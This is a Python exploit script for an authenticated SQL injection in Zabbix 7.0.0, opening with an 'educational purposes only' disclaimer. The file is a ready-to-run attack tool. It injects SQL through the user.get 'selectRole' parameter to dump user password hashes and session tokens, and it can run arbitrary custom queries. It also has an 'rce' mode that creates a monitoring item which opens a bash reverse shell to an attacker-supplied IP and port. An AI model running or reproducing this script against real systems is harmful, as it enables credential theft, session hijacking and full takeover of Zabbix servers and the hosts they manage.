# Made by Anthony (874anthony)
# This script is a Zabbix SQL injection vulnerability.
# For educational purposes only. 
# Use responsibly and only on systems you own or have permission to test.

import argparse
import requests

# CONSTANTS
HEADERS = {"Content-Type": "application/json-rpc"}

ZABBIX_API_JSON_ENDPOINT = 'api_jsonrpc.php'
ZABBIX_API_BASE_JSON = {
    "jsonrpc": "2.0", 
    "method": "<METHOD>", 
    "params": {}, 
    "id":1
}

ZABBIX_API_METHOD_AUTHENTICATE = 'user.login'
ZABBIX_API_METHOD_GET_USERS = 'user.get'

ZABBIX_API_METHOD_GET_HOSTS = 'host.get'
ZABBIX_API_METHOD_ITEM_CREATE = 'item.create'

ZABBIX_SQL_INJECTION_QUERY = 'name, (SQL_INJECTION_STATEMENT_HERE)'


class ZabbixSQLi: 
    def __init__(self):
        self.args = self.parse_arguments()
        self.API_URL = f"{self.args.url}{ZABBIX_API_JSON_ENDPOINT}"
        
        self.session = requests.Session()
        
        
        self.session.proxies.update({
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8081"
        })
        self.session.verify = False  # no ssl verification
        self.session.headers.update({
            'Accept': '*/*',
            'Cache-Control': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='Authenticated SQL Injection - Zabbix 7.0.0')
        parser.add_argument('-u', '--url', type=str, help='The URL to Zabbix (example: http://example.com/zabbix/)', required=True)
        parser.add_argument('-U', '--username', type=str, help='The username to authenticate within Zabbix', required=True)
        parser.add_argument('-p', '--password', type=str, help='The password to authenticate within Zabbix', required=True)
        parser.add_argument('--ip', type=str, help='The listening IP to gain reverse shell')
        parser.add_argument('--port', type=int, help='The listening PORT to gain reverse shell, if not specified defaults to 9001', default=9001)
        parser.add_argument('--admin_token', type=str, help='The API Session Token of an Admin user to gain reverse shell')

        # Mode options
        parser.add_argument(
            '--mode', 
            choices=['leak-users', 'leak-tokens', 'rce', 'custom'],
            default='rce',
            help="The action to perform: 'leak-users' dump user hashes, 'leak-tokens' dump session api tokens, 'rce' gives command execution, 'custom' to run a custom SQL query.",
            # required=True
        )

        # Optional - Run a custom query if used
        parser.add_argument('--query', type=str, help='Custom SQL query you want to run through the SQL Injection')

        args = parser.parse_args()

        # Check if "http" prefix is present, if not, default to https
        if not args.url.startswith(('http://', 'https://')):
            args.url = f'https://{args.url}'

        if not args.url.endswith('/'):
            args.url += '/'

        return args
    
    def zabbix_api_call(self, method, params={}, auth_token=''):
        body_data = ZABBIX_API_BASE_JSON.copy()
        body_data['method'] = method
        body_data['params'] = params

        if auth_token:
            body_data['auth'] = auth_token
        
        try:
            response = self.session.post(self.API_URL, headers=HEADERS, json=body_data)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"[!] Request failed with: {e}")
            return None

    def get_api_token(self):
        params = {
            "username": self.args.username,
            "password": self.args.password
        }

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_AUTHENTICATE, params)
        auth_token = resp.get('result', None)

        if not auth_token:
            print("[-] There was an ERROR with the API, please check the credentials.")
        else:
            print("[+] Authenticated successfully. Grabbing the auth token")

        return auth_token

    def get_user_id(self, auth_token):
        params = {
            "editable": True,
            "output": ["userid", "username"]
        }

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_GET_USERS, params, auth_token)
        user_details = resp.get('result', [])

        if not user_details:
            return None
        
        return user_details[0].get('userid')

    def leak_users(self, auth_token, user_id):
        sqli_query = "SELECT GROUP_CONCAT(userid, ', ', username, ', ', passwd, ', ', roleid, ' || ') FROM users"
        
        params = {
            "editable": True,
            "output": ["userid", "username"],
            "selectRole": [ZABBIX_SQL_INJECTION_QUERY.replace('SQL_INJECTION_STATEMENT_HERE', sqli_query)],
            "userids": [user_id]
        }   

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_GET_USERS, params, auth_token)

        user_details = resp.get('result', [])

        if not user_details:
            return None

        print(f"[+] Found users in the database, leaking them now...")

        users = user_details[0].get('role', {}).get(f'({sqli_query})').split(' || ')

        for u in users[:-1]:
            userid, username, hash, roleid = u.split(', ')
            print(f'userid: {userid.replace(",", "")}, username: {username}, hash: {hash}, roleid: {roleid}')

    def leak_session_tokens(self, auth_token, user_id):
        sqli_query = "SELECT GROUP_CONCAT(sessionid, ', ', userid, ' || ') FROM sessions"

        params = {
            "editable": True,
            "output": ["userid", "username"],
            "selectRole": [ZABBIX_SQL_INJECTION_QUERY.replace('SQL_INJECTION_STATEMENT_HERE', sqli_query)],
            "userids": [user_id]
        }

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_GET_USERS, params, auth_token)

        user_details = resp.get('result', [])

        if not user_details:
            return None
        
        print(f"[+] Found session tokens in the database, leaking them now...")

        sessions = user_details[0].get('role', {}).get(f'({sqli_query})').split(' || ')

        for s in sessions[:-1]:
            token, userid = s.split(', ')
            print(f'userid: {userid}, token: {token.replace(",", "")}')            

    def custom_sql(self, auth_token, user_id):
        params = {
            "editable": True,
            "output": ["userid", "username"],
            "selectRole": [ZABBIX_SQL_INJECTION_QUERY.replace('SQL_INJECTION_STATEMENT_HERE', self.args.query)],
            "userids": [user_id]
        }

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_GET_USERS, params, auth_token)

        user_details = resp.get('result', [])
        
        if not user_details:
            return None
        
        users = user_details[0].get('role', {}).get(f'({self.args.query})')
    
        print(users) 

    def leak_hosts_interfaces(self): 
        params = {
            "output": ["hostid", "host"],
            "selectInterfaces": ["interfaceid"],
        }

        resp = self.zabbix_api_call(ZABBIX_API_METHOD_GET_HOSTS, params, auth_token=self.args.admin_token)

        host_details = resp.get('result', [])

        if not host_details:
            return None
        
        # TODO: This should be a loop for different hostids and interfaceids

        host_id = host_details[0].get('hostid', None)
        interface_id = host_details[0].get('interfaces',[])[0].get('interfaceid', None)

        print(f"[+] Encountered host_id {host_id} and interface_id {interface_id}")

        return host_id, interface_id

    def get_rce(self):
        print(f"[+] Open a new terminal and start listening to the port specified")

        host_id, interface_id = self.leak_hosts_interfaces()

        params = {
            "name": "rce",
            "key_": f"system.run[bash -c 'bash -i >& /dev/tcp/{self.args.ip}/{self.args.port} 0>&1']",
            "delay": 1,
            "hostid": host_id,
            "type": 0,
            "value_type": 1,
            "interfaceid": interface_id
        }

        self.zabbix_api_call(ZABBIX_API_METHOD_ITEM_CREATE, params, auth_token=self.args.admin_token)

if __name__ == '__main__':
    zbx = ZabbixSQLi()
    auth_token = zbx.get_api_token()
    user_id = zbx.get_user_id(auth_token)

    # zbx.leak_session_tokens(auth_token, user_id)

    if zbx.args.mode == 'custom':
        if not zbx.args.query:
            print("[!] You must provide --query when using mode 'custom'")
        else:
            zbx.custom_sql(auth_token, user_id)
    elif zbx.args.mode == 'rce':
        if not zbx.args.ip or not zbx.args.port or not zbx.args.admin_token:
            print("[!] You must provide --ip, --port and --admin_token when using mode 'rce'")
        else:
            zbx.get_rce()
    elif zbx.args.mode == 'leak-users':
        zbx.leak_users(auth_token, user_id)
    elif zbx.args.mode == 'leak-tokens':
        zbx.leak_session_tokens(auth_token, user_id)
    else:
        print("[!] Invalid mode selected. Please choose a valid mode.")
    
    print("[+] Finished")
    
